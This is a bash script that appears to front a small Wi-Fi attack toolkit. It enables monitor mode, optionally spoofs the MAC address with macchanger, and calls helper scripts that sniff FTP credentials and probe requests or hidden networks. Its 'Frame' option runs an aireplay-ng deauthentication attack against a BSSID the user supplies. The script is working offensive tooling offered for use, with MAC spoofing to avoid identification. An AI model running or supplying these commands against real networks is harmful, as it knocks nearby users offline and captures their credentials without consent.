#!/bin/bash

Pname="python" #use python3

function setcard() {
	sudo airmon-ng start $interface
	#mon=$(echo `sudo airmon-ng`|grep "phy" |cut -d ' ' -f6)
	mon=$(sudo airmon-ng start $interface|grep "mac80211" |cut -d ']' -f2|cut -d " " -f1)
	echo -e "\n[*] You can use 'sudo airmon-ng stop $mon' to stop."
	
	echo -e "[*] You can use (Need stop the airmon-ng.)\n'sudo ifconfig $interface down && sudo macchanger -p \
$interface && sudo ifconfig $interface up'\n[*] to correct mac address.(Need stop the airmon-ng.)"
	#Use mon
	if [ $option == FTP -o $option == ftp ]; then
        	 #use python code
        	 echo ""
		 sudo $Pname code/ftpSniff.py -i $mon     
	elif [ $option == Probe -o $option == probe ]; then
		 #use python code
         	 echo ""
		 read -p "[!] Select Mode [ ALL,Hidden ] : " Pmode
		 if [ $Pmode == ALL -o $Pmode == all ]; then
			 sudo $Pname code/SniffProbe.py -i $mon
		 elif [ $Pmode == Hidden -o $Pmode == hidden ]; then
			 sudo $Pname code/SniffHidden.py -i $mon
		 fi	  
	elif [ $option == Frame -o $option == frame ]; then
		 read -p '[!] Start deauthentication attack? [Y/N] ' fsend
	 	 read -p '[&] Enter the target BSSID: ' tb
		 if [ $fsend == "Y" -o $fsend == "y"  ]; then
		  	  sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $mon	
		 fi		
	fi	 
}

echo "[+] List:"
sudo iwconfig
read -p "[&] Please select interface : " interface
check=$(sudo iwconfig $interface)
#echo $check

if [ ! -n "$check" ]; then

	echo "[-] This interface no wireless extensions."

else
        mcheck=$(sudo iwconfig $interface|grep "Mode:" |cut -d ':' -f2|cut -d ' ' -f1)
        read -p '[&] Choose an option[ FTP,Probe,Frame ]: ' option
    
    if [ $option == FTP -o $option == ftp ]; then
	 echo "[=] Option : FTP "
    elif [ $option == Probe -o $option == probe ]; then
	 echo "[=] Option : Probe "	
    elif [ $option == Frame -o $option == frame ]; then
	 echo "[=] Option : Beacon Frame "
    else
	 echo " [-] Unknown option: $option"
	 exit 1
    fi

    read -p '[!] Change the mac address? [Y/N] ' key
   
    if [ $key == "Y" -o $key == "y"  ]; then
            sudo ifconfig $interface down
	    sudo macchanger -A $interface
	    sudo ifconfig $interface up
        
    else
    	    echo -e "\n[-] Don't Change the mac address."
    fi

	if [ "${mcheck}" == "Monitor" ]; then
		read -p "[!] Skip settings ?[Y/N]" skipset
        	if [ $skipset == "Y" -o $skipset == "y" ]; then
		 	if [ $option == FTP -o $option == ftp ]; then
                 		#use python code
                 		echo ""
				sudo $Pname code/ftpSniff.py -i $interface
			elif [ $option == Probe -o $option == probe ]; then
			 	 #use python code
                 		 echo ""
				 read -p  "[!] Select Mode [ ALL,Hidden ] : " Pmode
				 if [ $Pmode == ALL -o $Pmode == all ]; then
				 	  sudo $Pname code/SniffProbe.py -i $interface
				 elif [ $Pmode == Hidden -o $Pmode == hidden ]; then
				  	  sudo $Pname code/SniffHidden.py -i $interface
				 fi
			elif [ $option == Frame -o $option == frame ]; then
			  	 
				  read -p '[!] Start deauthentication attack? [Y/N] ' fsend
	 			  read -p '[&] Enter the target BSSID: ' tb
				  if [ $fsend == "Y" -o $fsend == "y"  ]; then
		  		       sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $interface	
				  fi	  
            		fi
		else
		      echo -e "\n[-] Don't skip."
		      setcard
		fi
        else 
	     setcard
    	fi

fi
